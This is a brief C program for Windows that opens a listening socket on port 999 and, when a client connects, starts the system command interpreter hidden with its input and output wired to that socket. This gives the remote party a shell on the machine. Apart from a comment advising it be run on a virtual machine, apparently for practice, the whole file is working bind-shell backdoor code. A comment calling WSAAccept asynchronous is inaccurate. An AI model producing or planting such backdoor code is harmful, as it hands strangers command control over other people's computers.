#include <WinSock2.h>
#pragma comment(lib, "Ws2_32.lib")
#include <tchar.h>

// WSASocket/WSAAccept are asynchronous version of socket/accept provided by Microsoft
// Run on virtual machine

int main(void)
{
	WSADATA wsaData;
	sockaddr_in sockaddr;
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;

	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&wsaData, sizeof(WSADATA));

	WSAStartup(MAKEWORD(2, 2), &wsaData);

	TCHAR szCmdPath[255];
	GetEnvironmentVariable(TEXT("COMSPEC"), szCmdPath, sizeof(szCmdPath));

	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(999);
	sockaddr.sin_addr.S_un.S_addr = INADDR_ANY;

	SOCKET CSockeet = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	bind(CSockeet, (SOCKADDR*)&sockaddr, sizeof(sockaddr));
	listen(CSockeet, 1);
	int iAddrSize = sizeof(sockaddr);
	SOCKET SSocket = WSAAccept(CSockeet, (SOCKADDR*)&sockaddr, &iAddrSize, NULL, NULL);

	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.wShowWindow = SW_HIDE;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput = (HANDLE)SSocket;
	StartupInfo.hStdOutput = (HANDLE)SSocket;
	StartupInfo.hStdError = (HANDLE)SSocket;

	CreateProcess(NULL, szCmdPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);

	closesocket(CSockeet);
	closesocket(SSocket);
	WSACleanup();

	return 0;
}